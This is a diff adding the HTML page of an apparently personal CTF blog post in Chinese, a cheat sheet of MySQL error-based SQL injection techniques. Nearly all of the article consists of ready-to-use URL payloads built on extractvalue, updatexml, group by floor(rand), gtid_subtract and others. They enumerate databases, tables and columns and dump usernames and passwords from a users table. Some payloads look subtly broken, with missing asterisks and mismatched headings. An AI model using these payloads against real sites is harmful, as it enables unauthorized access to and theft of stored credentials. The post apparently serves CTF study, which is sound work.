@@ -1,0 +1,295 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SQL注入2-报错注入 | sw3rt's b1og</title><meta name="author" content="sw3rt"><meta name="copyright" content="sw3rt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#FFFFFF"><meta name="description" content="骄傲是无知的产物。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入2-报错注入">
+<meta property="og:url" content="http://sw3rt.github.io/2024/02/14/Sql-Injection_2/index.html">
+<meta property="og:site_name" content="sw3rt&#39;s b1og">
+<meta property="og:description" content="骄傲是无知的产物。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://sw3rt.github.io/img/cover/cover2.jpg">
+<meta property="article:published_time" content="2024-02-13T16:00:01.000Z">
+<meta property="article:modified_time" content="2024-10-27T11:55:10.568Z">
+<meta property="article:author" content="sw3rt">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="Sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://sw3rt.github.io/img/cover/cover2.jpg"><link rel="shortcut icon" href="/img/index/header.jpg"><link rel="canonical" href="http://sw3rt.github.io/2024/02/14/Sql-Injection_2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!true && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        if (name && globalFn[key][name]) return
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0D0D0D')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#FFFFFF')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":150,"languages":{"author":"作者: sw3rt","link":"链接: ","source":"来源: sw3rt's b1og","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'null',
+  Snackbar: {"chs_to_cht":"已切换为繁体中文","cht_to_chs":"已切换为简体中文","day_to_night":"已切换为深色模式","night_to_day":"已切换为浅色模式","bgLight":"#a4d8fa","bgDark":"#00474f","position":"bottom-center"},
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SQL注入2-报错注入',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-10-27 19:55:10'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
+  const $loadingBox = document.getElementById('loading-box')
+  const $body = document.body
+  const preloader = {
+    endLoading: () => {
+      $body.style.overflow = ''
+      $loadingBox.classList.add('loaded')
+    },
+    initLoading: () => {
+      $body.style.overflow = 'hidden'
+      $loadingBox.classList.remove('loaded')
+    }
+  }
+
+  preloader.initLoading()
+  window.addEventListener('load', preloader.endLoading)
+
+  if (true) {
+    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
+    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
+  }
+})()</script><div id="web_bg" style="background-image: url(/img/index/background.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/index/header.jpg" onerror="onerror=null;src='/img/404/friend_404.png'" alt="avatar"/></div><div class="site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/index/header.jpg" alt="Logo"><span class="site-name">sw3rt's b1og</span></a><a class="nav-page-title" href="/"><span class="site-name">SQL注入2-报错注入</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SQL注入2-报错注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-02-13T16:00:01.000Z" title="发表于 2024-02-14 00:00:01">2024-02-14</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-27T11:55:10.568Z" title="更新于 2024-10-27 19:55:10">2024-10-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/">ctf</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ctf/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">587</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="MySQL数据库报错功能函数汇总"><a href="#MySQL数据库报错功能函数汇总" class="headerlink" title="MySQL数据库报错功能函数汇总"></a>MySQL数据库报错功能函数汇总</h1><p><img src="/../img/Sql-Injection_2/02a2add9fd614c1759369532754be472.png" alt="截图"></p>
+<br/>
+
+<h1 id="MySQL数据库报错注入"><a href="#MySQL数据库报错注入" class="headerlink" title="MySQL数据库报错注入"></a>MySQL数据库报错注入</h1><p>测试版本主要是mysql8.0。</p>
+<h2 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h2><h3 id="exp-709-condition"><a href="#exp-709-condition" class="headerlink" title="exp(709+condition)"></a>exp(709+condition)</h3><p>version [5.5.5, 5.5.49]</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">exp</span>(<span class="number">709</span><span class="operator">+</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="cot-1-condition"><a href="#cot-1-condition" class="headerlink" title="cot(1-condition)"></a>cot(1-condition)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> cot(<span class="number">1</span><span class="operator">-</span>(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>))</span><br></pre></td></tr></table></figure>
+
+<h3 id="cot-1-0"><a href="#cot-1-0" class="headerlink" title="cot(1&#x3D;0)"></a>cot(1&#x3D;0)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> cot(<span class="number">1</span><span class="number">-0</span>)</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h2 id="假函数注库名"><a href="#假函数注库名" class="headerlink" title="假函数注库名"></a>假函数注库名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> aa();</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h2 id="gtid"><a href="#gtid" class="headerlink" title="gtid"></a>gtid</h2><p>version [5.6.5,?]</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> gtid_subtract((<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h2 id="uuid"><a href="#uuid" class="headerlink" title="uuid"></a>uuid</h2><h3 id="uuid-to-bin"><a href="#uuid-to-bin" class="headerlink" title="uuid_to_bin()"></a>uuid_to_bin()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,UUID_TO_BIN((<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata));</span><br></pre></td></tr></table></figure>
+
+<h3 id="bin-to-uuid"><a href="#bin-to-uuid" class="headerlink" title="bin_to_uuid()"></a>bin_to_uuid()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> table1 <span class="keyword">where</span> id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,BIN_TO_UUID((<span class="keyword">select</span> group_concat(schema_name) <span class="keyword">from</span> information_schema.schemata));</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h2 id="join-using-注列名"><a href="#join-using-注列名" class="headerlink" title="join using()注列名"></a>join using()注列名</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1)b)c;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1)b <span class="keyword">using</span>(id))c;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1 a <span class="keyword">join</span> (<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> table1)b <span class="keyword">using</span>(id,<span class="keyword">value</span>))c;</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h2 id="空间函数Geohash"><a href="#空间函数Geohash" class="headerlink" title="空间函数Geohash"></a>空间函数Geohash</h2><p>version[5.7, ?)</p>
+<h3 id="ST-LatFromGeoHash"><a href="#ST-LatFromGeoHash" class="headerlink" title="ST_LatFromGeoHash"></a>ST_LatFromGeoHash</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ST_LongFromGeoHash(<span class="operator">&lt;</span>payload<span class="operator">&gt;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="ST-LongFromGeoHash"><a href="#ST-LongFromGeoHash" class="headerlink" title="ST_LongFromGeoHash"></a>ST_LongFromGeoHash</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ST_LongFromGeoHash(<span class="operator">&lt;</span>payload<span class="operator">&gt;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="ST-PointFromGeoHash"><a href="#ST-PointFromGeoHash" class="headerlink" title="ST_PointFromGeoHash"></a>ST_PointFromGeoHash</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> ST_PointFromGeoHash(<span class="operator">&lt;</span>payload<span class="operator">&gt;</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h2 id="xpath"><a href="#xpath" class="headerlink" title="xpath"></a>xpath</h2><h2 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h2><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e))--+ </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 3,1),0x7e))--+ </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 3,1),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e))--+ </span></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h2 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h2><h3 id="数据库-1"><a href="#数据库-1" class="headerlink" title="数据库"></a>数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e),1)--+ </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据表-1"><a href="#数据表-1" class="headerlink" title="数据表"></a>数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x7e),1)--+ </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="字段-1"><a href="#字段-1" class="headerlink" title="字段"></a>字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 3,1),0x7e),1)--+ </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据-1"><a href="#数据-1" class="headerlink" title="数据"></a>数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1, concat(0x7e,(select concat(id,0x7e,username,0x7e,password) from security.users limit 7,1),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<br/>
+
+<h2 id="group-by-floor"><a href="#group-by-floor" class="headerlink" title="group by floor"></a>group by floor</h2><p>version 5.x</p>
+<p>利用外键重复来产生报错，这个报错注入在mysql 8.x的版本中不存在。</p>
+<h3 id="数据库版本"><a href="#数据库版本" class="headerlink" title="数据库版本"></a>数据库版本</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据库-2"><a href="#数据库-2" class="headerlink" title="数据库"></a>数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(),concat(0x7e,(select schema_name from information_schema.schemata limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ </span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据表-2"><a href="#数据表-2" class="headerlink" title="数据表"></a>数据表</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="字段-2"><a href="#字段-2" class="headerlink" title="字段"></a>字段</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(),concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; limit 5,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="数据-2"><a href="#数据-2" class="headerlink" title="数据"></a>数据</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+</span></span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://sw3rt.github.io">sw3rt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://sw3rt.github.io/2024/02/14/Sql-Injection_2/">http://sw3rt.github.io/2024/02/14/Sql-Injection_2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://sw3rt.github.io" target="_blank">sw3rt's b1og</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/Sql%E6%B3%A8%E5%85%A5/">Sql注入</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/cover2.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="prev-post pull-left" href="/2024/02/14/Sql-Injection_1/" title="SQL注入1-注入点"><img class="cover" src="/img/cover/cover1.jpg" onerror="onerror=null;src='/img/404/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">SQL注入1-注入点</div></div></a><a class="next-post pull-right" href="/2024/09/15/PHP/" title="ctf中php题目随笔"><img class="cover" src="/img/cover/cover3.jpg" onerror="onerror=null;src='/img/404/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">ctf中php题目随笔</div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info is-center"><div class="avatar-img"><img src="/img/index/header.jpg" onerror="this.onerror=null;this.src='/img/404/friend_404.png'" alt="avatar"/></div><div class="author-info-name">sw3rt</div><div class="author-info-description">持续学习ing</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sw3rt" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:swertchan@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客！如果你有任何建议和意见，欢迎点击上方邮箱联系我。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E5%8A%9F%E8%83%BD%E5%87%BD%E6%95%B0%E6%B1%87%E6%80%BB"><span class="toc-number">1.</span> <span class="toc-text">MySQL数据库报错功能函数汇总</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">MySQL数据库报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E6%BA%A2%E5%87%BA"><span class="toc-number">2.1.</span> <span class="toc-text">数据溢出</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-709-condition"><span class="toc-number">2.1.1.</span> <span class="toc-text">exp(709+condition)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cot-1-condition"><span class="toc-number">2.1.2.</span> <span class="toc-text">cot(1-condition)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cot-1-0"><span class="toc-number">2.1.3.</span> <span class="toc-text">cot(1&#x3D;0)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%81%87%E5%87%BD%E6%95%B0%E6%B3%A8%E5%BA%93%E5%90%8D"><span class="toc-number">2.2.</span> <span class="toc-text">假函数注库名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gtid"><span class="toc-number">2.3.</span> <span class="toc-text">gtid</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#uuid"><span class="toc-number">2.4.</span> <span class="toc-text">uuid</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#uuid-to-bin"><span class="toc-number">2.4.1.</span> <span class="toc-text">uuid_to_bin()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bin-to-uuid"><span class="toc-number">2.4.2.</span> <span class="toc-text">bin_to_uuid()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#join-using-%E6%B3%A8%E5%88%97%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">join using()注列名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E9%97%B4%E5%87%BD%E6%95%B0Geohash"><span class="toc-number">2.6.</span> <span class="toc-text">空间函数Geohash</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-LatFromGeoHash"><span class="toc-number">2.6.1.</span> <span class="toc-text">ST_LatFromGeoHash</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ST-LongFromGeoHash"><span class="toc-number">2.6.2.</span> <span class="toc-text">ST_LongFromGeoHash</span></a></li><li class="toc-item 